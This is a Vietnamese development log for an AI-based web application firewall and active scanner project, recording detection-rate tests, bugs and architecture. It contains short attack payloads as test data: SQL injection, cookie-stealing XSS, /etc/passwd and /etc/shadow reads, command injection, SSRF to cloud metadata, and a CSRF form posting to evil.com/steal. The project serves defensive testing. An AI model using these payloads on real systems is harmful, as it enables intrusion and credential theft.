# 📓 NHẬT KÝ PHÁT TRIỂN - AI SECURITY WAF

---

## 28/03/2026 — Phiên làm việc: Kiểm thử Module 1 (Scanning Phase)

### 🕐 23:51 — Khởi động Module 1 (webg.py)

**Môi trường:**
- Python 3.12.3 (venv)
- TensorFlow 2.21.0
- Flask 3.1.3
- scikit-learn 1.8.0
- OS: Ubuntu Linux (không có GPU, chạy CPU)

**Khởi động:**
```
source .venv/bin/activate && python webg.py
```
- Model load thành công từ `/home/truongan/Desktop/aisecirity_scan/model/`
- Server chạy tại `http://127.0.0.1:5001`
- Cảnh báo: Không có GPU (CUDA lỗi 303), dùng CPU — inference vẫn OK

---

### 🧪 23:51 — Đợt Test 1: Payload cơ bản (7 test cases)

| # | Payload | Kết quả | Confidence | HTTP | Đánh giá |
|---|---------|---------|------------|------|----------|
| 1 | `admin' OR 1=1 --` | **SQLi** ✅ | 100.00% | 403 | ✅ Chặn đúng |
| 2 | `<img src=x onerror=alert(1)>` | **XSS** ✅ | 100.00% | 403 | ✅ Chặn đúng |
| 3 | `../../../../etc/passwd` | **Path Traversal** ✅ | 99.75% | 403 | ✅ Chặn đúng |
| 4 | `127.0.0.1; cat /etc/passwd` | **SQLi** ⚠️ | 90.77% | 403 | ⚠️ Chặn được nhưng SAI NHÃN (phải là CmdInj) |
| 5 | `http://169.254.169.254/latest/meta-data/` | **Normal** ❌ | 99.67% | 200 | ❌ BỎ LỌT — SSRF không bị chặn |
| 6 | `Xin chào tôi muốn tìm tài liệu NCKH` | **Normal** ✅ | 99.62% | 200 | ✅ Cho qua đúng |
| 7 | `https://www.google.com/search?q=machine+learning` | **Normal** ✅ | 98.75% | 200 | ✅ Cho qua đúng (đã fix false positive URL) |

**Nhận xét đợt 1:**
- SQLi, XSS, Path Traversal: **Rất mạnh** (99-100%)
- Command Injection: Bị nhầm thành SQLi (có chặn nhưng sai nhãn)
- SSRF: **Hoàn toàn bỏ lọt** — đây là lỗ hổng nghiêm trọng nhất
- Normal traffic: **Không false positive** — cải thiện tốt so với bản trước

---

### 🧪 23:52 — Đợt Test 2: Payload nâng cao (8 test cases)

| # | Payload | Kết quả | Confidence | HTTP | Đánh giá |
|---|---------|---------|------------|------|----------|
| 8 | `<form action=http://evil.com/steal ...>` (CSRF) | **XSS** ⚠️ | 97.10% | 403 | ⚠️ Chặn được nhưng SAI NHÃN (phải là CSRF, top2 CSRF 2.9%) |
| 9 | `1 UNION SELECT username,password FROM users--` | **SQLi** ✅ | 100.00% | 403 | ✅ Chặn đúng — UNION-based SQLi |
| 10 | `%3Cscript%3Ealert(document.cookie)%3C/script%3E` | **XSS** ✅ | 99.04% | 403 | ✅ Chặn đúng — URL-encoded XSS |
| 11 | `1 AND SLEEP(5)--` | **SQLi** ✅ | 100.00% | 403 | ✅ Chặn đúng — Blind/Time-based SQLi |
| 12 | `test && whoami` | **Normal** ❌ | 99.20% | 200 | ❌ BỎ LỌT — Command Injection |
| 13 | `ls \| cat /etc/shadow` | **Normal** ❌ | 96.03% | 200 | ❌ BỎ LỌT — Command Injection pipe |
| 14 | `http://127.0.0.1:22` | **Normal** ❌ | 98.66% | 200 | ❌ BỎ LỌT — SSRF nội bộ |
| 15 | `Báo cáo nghiên cứu khoa học năm 2026` | **Normal** ✅ | 99.99% | 200 | ✅ Cho qua đúng — tiếng Việt |

**Nhận xét đợt 2:**
- SQLi nâng cao (UNION, Blind): **Tuyệt vời** (100%)
- XSS encoded: Vẫn bắt được (99%) — model nhận diện pattern tốt
- CSRF: Bị classify thành XSS (vì có `<form>` tag), chưa tối ưu
- **Command Injection: BỎ LỌT HOÀN TOÀN** — `&&`, `|` không bị phát hiện
- **SSRF: BỎ LỌT HOÀN TOÀN** — URL nội bộ không bị nhận diện

---

### 📊 Tổng kết kết quả scan Module 1

#### Bảng Detection Rate theo loại tấn công:

| Loại tấn công | Số test | Phát hiện đúng nhãn | Chặn được (dù sai nhãn) | Bỏ lọt | Detection Rate |
|---|---|---|---|---|---|
| **SQLi** | 4 | 4/4 ✅ | — | 0 | **100%** |
| **XSS** | 2 | 2/2 ✅ | — | 0 | **100%** |
| **Path Traversal** | 1 | 1/1 ✅ | — | 0 | **100%** |
| **Command Injection** | 3 | 0/3 ❌ | 1/3 (sai nhãn SQLi) | 2/3 | **33%** ❌ |
| **SSRF** | 2 | 0/2 ❌ | — | 2/2 | **0%** ❌❌ |
| **CSRF** | 1 | 0/1 ❌ | 1/1 (sai nhãn XSS) | 0 | **0% đúng nhãn** |
| **Normal (False Pos)** | 4 | 4/4 ✅ | — | — | **100%** ✅ |
| |
| **TỔNG CHẶN** | **13 attack** | **7/13 đúng** | **2/13 sai nhãn** | **4/13 lọt** | **69% chặn** |

#### Tóm tắt:
- ✅ **Mạnh:** SQLi (100%), XSS (100%), Path Traversal (100%)
- ⚠️ **Yếu:** CSRF (nhận nhầm XSS), CmdInj (1/3 sai nhãn thành SQLi)
- ❌ **Lỗ hổng nghiêm trọng:** Command Injection (66% bỏ lọt), SSRF (100% bỏ lọt)
- ✅ **False Positive Rate:** 0% (không chặn nhầm traffic hợp lệ)

---

### 🐛 Danh sách Bug/Issue phát hiện

#### BUG-001: SSRF không bị phát hiện [CRITICAL]
- **Mô tả:** Payload SSRF (`http://169.254.169.254/...`, `http://127.0.0.1:22`) bị nhận nhầm là Normal (99.67%)
- **Nguyên nhân:** Dữ liệu SSRF trong tập huấn luyện toàn bộ là synthetic (regex nhân bản 50 lần từ JSONL), model không học được pattern thực
- **Impact:** Attacker có thể scan port nội bộ, truy cập AWS metadata, v.v.
- **Trạng thái:** 🔴 Chưa fix

#### BUG-002: Command Injection bỏ lọt [CRITICAL]
- **Mô tả:** Payload `test && whoami`, `ls | cat /etc/shadow` hoàn toàn lọt qua (96-99% Normal)
- **Nguyên nhân:** Dữ liệu CmdInj chỉ có 520 mẫu gốc → oversampling lên 3000 nhưng đều là copies
- **Impact:** Attacker có thể thực thi lệnh hệ thống
- **Trạng thái:** 🔴 Chưa fix

#### BUG-003: CSRF bị phân loại nhầm thành XSS [MEDIUM]
- **Mô tả:** CSRF payload có `<form>` → model classify là XSS (vì thấy HTML tag)
- **Nguyên nhân:** Chỉ có 92 mẫu CSRF, quá ít so với 7873 mẫu XSS
- **Impact:** Vẫn chặn được (đúng) nhưng report sai loại tấn công
- **Trạng thái:** 🟡 Không ảnh hưởng bảo mật, cần cải thiện

#### BUG-004: CmdInj bị nhận nhầm SQLi [LOW]
- **Mô tả:** `127.0.0.1; cat /etc/passwd` → Model phân loại SQLi (90.77%)
- **Nguyên nhân:** Ký tự `;` xuất hiện nhiều trong cả SQLi và CmdInj
- **Impact:** Vẫn chặn được (đúng) nhưng báo cáo sai loại
- **Trạng thái:** 🟡 Không ảnh hưởng bảo mật

---

### ✅ Điểm mạnh của Module 1 (webg.py)

1. **API hoạt động ổn định** — Flask server khởi động nhanh, không crash
2. **Top 3 threats** — Trả về 3 mối đe dọa cao nhất kèm confidence, rất hữu ích cho phân tích
3. **Logging an toàn** — Hash payload thay vì log thô, tránh rò rỉ thông tin
4. **Threshold linh hoạt** — 45% threshold có thể điều chỉnh
5. **MarkupSafe escape** — Có layer bảo vệ thứ 2 chống XSS
6. **Hỗ trợ cả GET và POST** — Tương thích nhiều loại client
7. **CORS enabled** — Frontend HTML có thể gọi cross-origin
8. **Inference nhanh** — ~80ms/request trên CPU (chấp nhận được)

---

### 🔧 TODO — Việc cần làm tiếp

- [ ] **[P0]** Thu thập thêm dữ liệu SSRF thực tế (ít nhất 2000 mẫu)
- [ ] **[P0]** Thu thập thêm dữ liệu Command Injection đa dạng (pipe `|`, backtick `` ` ``, `$(...)`)
- [ ] **[P1]** Cân bằng lại CSRF data (hiện chỉ 92 mẫu, cần 1000+)
- [ ] **[P1]** Thêm rule-based layer cho SSRF (regex check `169.254.x.x`, `localhost`, `127.0.0.1`)
- [ ] **[P2]** Thiết kế API chuẩn `/api/v1/scan` với JSON schema rõ ràng
- [ ] **[P2]** Viết unit test tự động cho 15 test cases trên
- [ ] **[P3]** Thêm batch scan endpoint `/api/v1/scan/batch`

---

### 📝 Ghi chú khác

- Model file: `deep_learning_agent_core.keras` (8.6MB) — đã export OK trên Linux
- `webg.py` đã sửa path từ `D:\AI\clawweb\model` sang `/home/truongan/Desktop/aisecirity_scan/model` — chạy được trên Linux
- Không có lỗi runtime nào trong phiên test
- Server log rất chi tiết — dễ debug

---

*Kết thúc phiên: 23:53 — Tổng thời gian: ~12 phút*

---
---

## 29/03/2026 — Phiên làm việc: Sửa lại kiến trúc + Đổi tên file

### 🕐 01:30 — Phát hiện sai hướng thiết kế Module 1

**Vấn đề:** Nhìn lại ý tưởng ban đầu của pipeline, Module 1 được mô tả là:
> *"AI Scan WAF thực hiện quét và **thử tấn công trực tiếp vào sản phẩm**"*

Tức Module 1 phải là **kẻ tấn công giả lập (Active Scanner)** — chủ động gửi payload tấn công vào web mục tiêu, phân tích response, rồi báo cáo lỗ hổng.

Nhưng code `webg.py` hiện tại đang hoạt động như một **tường lửa thụ động (Passive WAF)** — ngồi chờ request đến rồi check. Đó đúng ra là việc của Module 2.

#### Bảng so sánh SAI vs ĐÚNG:

| | Ý tưởng ban đầu | Code cũ (SAI) |
|---|---|---|
| **Module 1** | 🗡️ Active Scanner — chủ động tấn công thử web sản phẩm | ❌ Đang làm WAF thụ động (chặn request) |
| **Module 2** | 🛡️ WAF 24/7 — bảo vệ, chặn request xấu realtime | ✅ Đúng rồi (reverse proxy + filter) |

#### Module 1 đúng nghĩa phải làm gì:
1. Nhận **URL web sản phẩm** (ví dụ `http://localhost:5173`)
2. **Tự động gửi** hàng loạt payload tấn công (SQLi, XSS, CmdInj, Path Traversal, SSRF, CSRF)
3. **Phân tích response** — xem tấn công có lọt vào không
4. **Tạo báo cáo lỗ hổng** — endpoint nào bị dính, loại gì, mức độ nguy hiểm
5. Nếu có lỗi → gửi về **Feedback Loop** cho AI Agent sửa code

**Kết luận:** Code hiện tại của `webg.py` (classify payload) vẫn giữ lại làm **lõi AI engine**, nhưng cần bọc thêm logic **scanner chủ động** bên ngoài.

---

### 🔄 01:31 — Đổi tên file cho đúng cấu trúc

#### Các file đã đổi tên:

| File cũ | File mới | Vai trò |
|---------|----------|---------|
| `webg.py` | **`modul1_scanner.py`** | Module 1 — AI Scanner (quét + giả lập tấn công) |
| `webnhung.py` | **`modul2_waf.py`** | Module 2 — AI WAF 24/7 (bảo vệ realtime) |
| `webtest.py` | `webtest.py` *(giữ nguyên)* | Web mục tiêu có lỗ hổng (testbed) |
| `ai_waf_scanner.html` | `ai_waf_scanner.html` *(giữ nguyên)* | Giao diện quét thủ công |

#### Lệnh thực thi:
```bash
mv webg.py modul1_scanner.py
mv webnhung.py modul2_waf.py
```

#### Cấu trúc project sau khi đổi tên:
```
📂 aisecirity_scan/
├── 🗡️ modul1_scanner.py      ← Module 1: AI Scanner (quét + tấn công thử)
├── 🛡️ modul2_waf.py           ← Module 2: AI WAF 24/7 (bảo vệ)
├── 🎯 webtest.py              ← Web mục tiêu có lỗ hổng (testbed)
├── 🖥️ ai_waf_scanner.html     ← Giao diện quét thủ công
├── 🧠 projectai.ipynb         ← Huấn luyện AI model (Bi-LSTM)
├── 📂 model/                  ← Model đã export
├── 📂 data/                   ← Dữ liệu huấn luyện
├── 📂 tongquat/               ← Tài liệu cũ
├── 📓 nhat_ky_phat_trien.md   ← File này
└── 📦 requirements.txt        ← Dependencies
```

---

### 📝 Ghi chú về hướng phát triển tiếp Module 1

**Hiện tại `modul1_scanner.py` đang có:**
- ✅ Lõi AI model (load Bi-LSTM, classify payload)
- ✅ Flask API endpoint `/search`
- ✅ Middleware WAF (before_request)
- ✅ Top 3 threats response

**Cần thêm để đúng ý tưởng Active Scanner:**
- [ ] Hàm `scan_target(url)` — nhận URL web → tự crawl tìm form/input
- [ ] Bộ payload tấn công có sẵn (wordlist cho SQLi, XSS, CmdInj, SSRF...)
- [ ] Logic gửi payload vào từng endpoint và phân tích response
- [ ] Tạo báo cáo scan tự động (JSON + HTML)
- [ ] Kết nối với Feedback Loop (nếu phát hiện lỗi → thông báo)

**Phần middleware WAF hiện tại** trong `modul1_scanner.py` có thể tách ra hoặc giữ song song — vì bản chất model classify vẫn dùng chung cho cả scanner lẫn WAF.

---

*Kết thúc phiên: 01:32 — Tổng thời gian: ~2 phút*

---
---

## 29/03/2026 — Phiên làm việc: Viết lại Module 1 thành Active Scanner + Test

### 🕐 01:36 — Viết lại modul1_scanner.py

**Thay đổi:** Viết lại hoàn toàn `modul1_scanner.py` từ WAF thụ động → **Active Vulnerability Scanner**.

**Kiến trúc mới gồm 3 pha:**
1. **Phase 1 — Crawl:** Parse HTML trang chủ, tìm `<form>` + link có query params → liệt kê endpoint
2. **Phase 2 — Attack:** Gửi hàng loạt payload (SQLi, XSS, CmdInj, PathTraversal, SSRF) vào từng endpoint, phân tích response bằng regex signatures + AI model
3. **Phase 3 — Report:** In báo cáo tổng hợp ra terminal + lưu file JSON + Markdown

**Các class/component:**
- `FormParser` — parse HTML tìm form và link
- `AIEngine` — load model Bi-LSTM classify payload
- `VulnerabilityScanner` — scanner chính (crawl → attack → report)
- `ATTACK_PAYLOADS` — 31 payload tấn công (8 SQLi, 6 XSS, 6 CmdInj, 6 PathTrav, 5 SSRF)
- `VULN_SIGNATURES` — regex phát hiện tấn công thành công trong response

**Cách sử dụng:**
```bash
python modul1_scanner.py --target http://localhost:5173 --report
```

---

### 🧪 01:38 — Test scan webtest.py (web có lỗ hổng)

**Khởi động target:**
```bash
python webtest.py  # port 5173
python modul1_scanner.py --target http://localhost:5173 --report
```

**Kết quả Phase 1 — Crawl:**
- ✅ Tìm thấy **4 endpoint** tự động:
  - `GET /search-user?id`  (SQLi testbed)
  - `GET /feedback?msg`    (XSS testbed)
  - `GET /view-doc?file`   (Path Traversal testbed)
  - `GET /ping?ip`         (Command Injection testbed)

**Kết quả Phase 2 — Attack:**
- Gửi **124 payloads** (31 payload × 4 endpoint)
- Phát hiện **38 lỗ hổng** thực sự!

| Loại | Số lỗ hổng | Mức độ | Endpoints bị dính |
|------|-----------|--------|-------------------|
| **SQLi** | 10 | 🔴 CRITICAL | /search-user, /feedback, /view-doc, /ping |
| **XSS** | 15 | 🟠 HIGH | /search-user, /feedback, /view-doc |
| **Path Traversal** | 12 | 🟠 HIGH | Tất cả 4 endpoint |
| **Command Injection** | 1 | 🔴 CRITICAL | /ping (backtick `id` → uid=1000) |
| **TỔNG** | **38** | | **4/4 endpoint đều có lỗi** |

**Điểm an toàn: 0/100** (cả 4 endpoint đều bị dính ít nhất 1 lỗi)

**Thời gian scan: 6.7 giây** (124 payloads, nhanh)

---

### ✅ Phát hiện đáng chú ý

1. **SQLi /search-user → RÒ RỈ DỮ LIỆU THẬT:**
   - Payload `' OR '1'='1` → response chứa `(1, 'admin', 'password123', 'Administrator')`
   - Rò rỉ username + password + role — **CRITICAL**

2. **Command Injection /ping → THỰC THI LỆNH HỆ THỐNG:**
   - Payload `` `id` `` → response chứa `uid=1000` — chạy lệnh thật trên server
   - **Vô cùng nguy hiểm** trong production

3. **XSS /feedback → UNESCAPED HTML:**
   - Payload reflect nguyên vẹn (không escape) → script sẽ execute trực tiếp

4. **Báo cáo tự động đã lưu:**
   - `scan_report_20260329_013849.json` — dữ liệu chi tiết
   - `scan_report_20260329_013849.md` — báo cáo dạng Markdown

---

### 📝 So sánh Module 1 cũ vs mới

| Tiêu chí | webg.py (Cũ) | modul1_scanner.py (Mới) |
|----------|--------------|------------------------|
| **Chức năng** | WAF thụ động, chờ request | Active Scanner, chủ động tấn công |
| **Tìm endpoint** | Không | ✅ Tự crawl HTML tìm form/link |
| **Gửi payload** | Không | ✅ 31 payload × N endpoints |
| **Phân tích response** | Không | ✅ Regex signatures + AI model |
| **Tạo báo cáo** | Không | ✅ JSON + Markdown tự động |
| **CLI** | Chạy server Flask | ✅ `--target URL --report` |
| **Đúng ý tưởng ban đầu** | ❌ | ✅ |

---

*Kết thúc phiên: 01:40 — Tổng thời gian: ~4 phút*

---
---

## 29/03/2026 — Phiên làm việc: Nâng cấp giao diện HTML (ai_waf_scanner.html)

### 🕐 01:52 — Redesign toàn bộ giao diện Module 1

**Lý do:** Phiên trước bị treo máy giữa chừng. Giao diện HTML cũ đã hoạt động cơ bản nhưng còn thiếu nhiều tính năng quan trọng cho một giao diện "trực quan" đúng nghĩa.

**Thay đổi:** Viết lại hoàn toàn `ai_waf_scanner.html` — giữ nguyên logic kết nối API backend (`modul1_scanner.py --server` trên port 5001), nâng cấp mạnh về UI/UX.

#### Danh sách tính năng mới:

| # | Tính năng | Mô tả | Trạng thái |
|---|-----------|-------|------------|
| 1 | **Server Health Check** | Auto ping `/api/health` mỗi 15s, hiện trạng thái online/offline + AI Engine | ✅ |
| 2 | **Animated Phase Steps** | 3 bước (Crawl → Attack → Report) có icon, animation glow, tự chuyển phase | ✅ |
| 3 | **Endpoints Discovery** | Hiển thị danh sách endpoint phát hiện (method, path, param) dạng grid cards | ✅ |
| 4 | **Target Info Bar** | Hiện URL, thời gian scan, ngày tháng sau khi scan xong | ✅ |
| 5 | **Scan History** | Lưu lịch sử scan vào localStorage (tối đa 20 lần), panel toggle | ✅ |
| 6 | **Export Functions** | Nút xuất JSON + Copy báo cáo text | ✅ |
| 7 | **Dark Glassmorphism Theme** | Background animated glow, backdrop-filter blur, gradient accent colors | ✅ |
| 8 | **Score Ring lớn hơn** | Tăng từ 110px → 130px, thêm drop-shadow, animation mượt hơn | ✅ |

#### Thay đổi thiết kế (CSS):

| Thuộc tính | Cũ | Mới |
|------------|-----|-----|
| Background | `#0a0e1a` | `#06090f` (tối hơn) |
| Glow effects | 2 điểm sáng | 3 điểm sáng (indigo + purple + pink) |
| Border | solid | semi-transparent `rgba(99,102,241,0.12)` |
| Cards | `background: var(--bg-card)` | `backdrop-filter: blur(16px)` + class `.glass-card` |
| Font weights | 300-800 | 300-900 (thêm Black) |
| Scrollbar | Default | Custom styled |
| Responsive breakpoint | 640px | 700px |

#### Thay đổi JavaScript:

- **Thêm:** `checkHealth()` — gọi API health endpoint, cập nhật status dot
- **Thêm:** `setPhase(n)` — quản lý trạng thái 3 phase steps (active/done)
- **Thêm:** `renderEndpoints(data)` — hiện endpoints phát hiện từ Phase 1
- **Thêm:** `saveScanHistory()` / `renderHistory()` — lưu/hiện lịch sử localStorage
- **Thêm:** `exportJSON()` / `copyReport()` — xuất kết quả
- **Thêm:** `toggleHistory()` — đóng/mở panel lịch sử
- **Giữ nguyên:** `startScan()`, `renderResults()`, `escapeHtml()` (có cải thiện)

#### File thay đổi:

| File | Hành động | Dung lượng |
|------|-----------|-----------|
| `ai_waf_scanner.html` | **Viết lại** | 726 → ~730 dòng |
| `modul1_scanner.py` | Không đổi | 815 dòng |

#### Cách sử dụng:

```bash
# Terminal 1: Chạy backend API
source .venv/bin/activate && python modul1_scanner.py --server

# Terminal 2: Chạy web testbed (nếu muốn scan)
python webtest.py

# Mở giao diện: http://127.0.0.1:5001
```

**Backend phục vụ:** `modul1_scanner.py` route `/` serve trực tiếp file `ai_waf_scanner.html`.

---

### 📝 Giao diện hoạt động như thế nào

1. Mở `http://127.0.0.1:5001` → Server tự serve `ai_waf_scanner.html`
2. Góc trên hiện **trạng thái server** (online/offline) — auto refresh 15s
3. Nhập URL target → Click "Bắt đầu quét"
4. **Phase Steps** hiện animation 3 bước:
   - 🔍 Crawl → 🗡️ Attack → 📋 Report
5. Khi xong:
   - Hiện **Endpoints phát hiện** (grid cards)
   - Hiện **Score Ring** + thống kê (endpoints, payloads, lỗ hổng, thời gian)
   - Hiện **Vulnerability Cards** (expand/collapse, severity badge, payload samples)
6. Có nút **Xuất JSON** và **Copy báo cáo**
7. Lịch sử scan lưu trong **localStorage** — bấm "📋 Lịch sử Scan" để xem

---

*Kết thúc phiên: 01:55 — Tổng thời gian: ~3 phút*

---
---

## 29/03/2026 — Phiên làm việc: Tổng hợp + Push lên GitHub (14:36)

### 🕐 14:36 — Tổng hợp lại lịch sử phát triển

**Bối cảnh:** Không thấy lịch sử trò chuyện giữa các phiên — tổng hợp lại toàn bộ quá trình phát triển dự án từ các phiên trước để lưu trữ.

#### 📅 Dòng thời gian phát triển (tổng hợp từ tất cả các phiên):

| Thời gian | Sự kiện | Trạng thái |
|-----------|---------|------------|
| **28/03 ~12:36** | Clone repo từ GitHub về máy local (`frograiny/aisecirity_scan`) | ✅ |
| **28/03 ~16:38** | Review tiến độ tổng thể dự án, tạo báo cáo chi tiết 5 giai đoạn | ✅ |
| | Phát hiện Module 1 (`webg.py`) đang làm sai hướng (WAF thụ động thay vì Scanner chủ động) | ✅ |
| | Đổi tên: `webg.py` → `modul1_scanner.py`, `webnhung.py` → `modul2_waf.py` | ✅ |
| | Viết lại Module 1 thành Active Vulnerability Scanner (crawl → attack → report) | ✅ |
| | Test scan `webtest.py` → phát hiện **38 lỗ hổng**, điểm an toàn **0/100** | ✅ |
| **28/03 ~18:51** | Redesign giao diện `ai_waf_scanner.html` — dark glassmorphism theme | ✅ |
| | Thêm: Server Health Check, Phase Steps animation, Endpoints Discovery, Scan History | ✅ |
| | Thêm: Export JSON, Copy báo cáo, Score Ring lớn hơn | ✅ |
| | Commit: `🗡️ Module 1: Active Vulnerability Scanner + Web UI` | ✅ |
| **29/03 14:36** | Tổng hợp nhật ký + Push lên GitHub | 🔄 Đang làm |

#### 📊 Tiến độ tổng thể dự án (cập nhật):

| Giai đoạn | Tiến độ | Ghi chú |
|-----------|---------|---------|
| **1. Dev Phase** — Huấn luyện AI Model | **95%** ✅ | Bi-LSTM, accuracy 99.68% |
| **2. Scanning Phase** — Module 1 (Active Scanner) | **80%** 🟡 | Scanner + UI hoàn thành, thiếu SAST |
| **3. Feedback Loop** — Vòng lặp phản hồi | **5%** 🔴 | Chưa triển khai |
| **4. Ops Phase** — Module 2 (WAF 24/7) | **60%** 🟡 | Reverse proxy có, thiếu monitoring |
| **5. Deploy** — Triển khai thực tế | **10%** 🔴 | Chưa Docker/CI-CD |
| **Tổng** | **~60%** | |

---

### 🚀 14:37 — Push code lên GitHub

**Repository:** `https://github.com/frograiny/aisecirity_scan`

**Files trong commit:**
```
📂 aisecirity_scan/
├── 🗡️ modul1_scanner.py      ← Module 1: Active Scanner (30KB)
├── 🛡️ modul2_waf.py           ← Module 2: AI WAF (10KB)
├── 🎯 webtest.py              ← Web testbed có lỗ hổng (7KB)
├── 🖥️ ai_waf_scanner.html     ← Giao diện quét (49KB)
├── 🧠 projectai.ipynb         ← Huấn luyện AI model (37KB)
├── 📂 model/                  ← Model Bi-LSTM đã export
├── 📂 data/                   ← Scripts tải dữ liệu
├── 📓 nhat_ky_phat_trien.md   ← File này
├── 📦 requirements.txt        ← Dependencies
└── 🚫 .gitignore              ← Bỏ qua .venv, data CSV, cache
```

**Lệnh push:**
```bash
git add -A && git commit -m "📓 Cập nhật nhật ký phát triển" && git push origin main
```

---

### 📝 Ghi chú về lịch sử trò chuyện

- Lịch sử các phiên trò chuyện **được lưu cục bộ** trên máy, không đồng bộ qua các phiên
- Các conversation ID đã thực hiện:
  - `e8fdcfa3` — Clone repo (28/03 12:36)
  - `6b43bfd6` — Review tiến độ + Viết lại Module 1 (28/03 16:38)
  - `f05bb6c9` — Redesign UI (28/03 18:51)
  - `993d56d5` — Phiên hiện tại: tổng hợp + push (29/03 14:36)
- Nội dung các phiên trước đã được ghi lại đầy đủ trong file nhật ký này

---


---
---

## 04/04/2026 — Phiên làm việc: Hoàn thiện Module 2 (AI WAF Shield)

### 🕐 14:10 — Tóm tắt kiến trúc Module 2 (`modul2_waf.py`)

**Mục tiêu:** Xây dựng hệ thống bảo vệ 24/7, đóng vai trò là một **Reverse Proxy** thông minh đứng trước Web Server thật để lọc mọi traffic xấu.

#### 🧠 Các thành phần cốt lõi:

| Thành phần | Chức năng chính | Vai trò |
|-----------|-----------------|---------|
| **`PayloadCache`** | Lưu kết quả scan vào RAM (LRU + TTL) | Tăng tốc xử lý, giảm tải cho CPU/Model AI khi gặp payload trùng lặp. |
| **`RateLimiter`** | Giới hạn 100 req/phút (Normal) hoặc 10 req/phút (Flagged) | Chống Brute-force, DoS và hạn chế attacker dò quét. |
| **`IPBlacklist`** | Tự động cấm IP 10 phút nếu bị chặn 5 lần trong 60s | Cách ly triệt để các nguồn tấn công dồn dập tự động. |
| **`AlertSystem`** | Terminal color alert + Discord/Telegram Webhook | Thông báo ngay lập tức cho admin khi hệ thống bị tấn công quy mô lớn. |
| **`AIEngine`** | Load model Bi-LSTM (Accuracy 93.42%) | Trái tim của hệ thống, phân loại: SQLi, XSS, CmdInj, PathTrav, SSRF... |

#### 🔄 Luồng xử lý request (Flow):

1. **Request In** ➔ Mọi yêu cầu HTTP đi vào WAF (Port 5000).
2. **`security_filter()`** ➔ Middleware thực hiện 4 bước kiểm tra:
   - **Step 1: Blacklist** ➔ Nếu IP nằm trong danh sách cấm ➔ **Block (403)**.
   - **Step 2: Rate Limit** ➔ Nếu vượt ngưỡng yêu cầu/giây ➔ **Block (429)**.
   - **Step 3: Extract Data** ➔ Gom tất cả: Query params, JSON body, Form data.
   - **Step 4: AI Scan** ➔ Gọi `scan_payload()` cho từng item.
     - Kiểm tra `Cache` trước ➔ Nếu miss ➔ Đưa vào `Bi-LSTM Model`.
     - Nếu phát hiện tấn công (Conf > 75%) ➔ Ghi nhận vi phạm vào Blacklist/RateLimit ➔ Gửi Alert ➔ **Block (403)**.
3. **`proxy()`** ➔ Nếu an toàn, WAF chuyển tiếp request tới Backend thật (`localhost:5173`).
   - Có cơ chế **Retry (3 lần)** nếu backend phản hồi chậm hoặc timeout.
4. **Response Out** ➔ Trả kết quả từ Backend về cho người dùng.

#### 📊 Thống kê & Giám sát:
- Endpoint `/ai-waf/health`: Kiểm tra sức khoẻ hệ thống và kết nối Backend.
- Endpoint `/ai-waf/stats`: Dashboard tổng hợp (tỉ lệ cache hit, số IP bị ban, loại tấn công phổ biến).

---

*Kết thúc phiên: 14:15 — Tổng thời gian: ~10 phút*

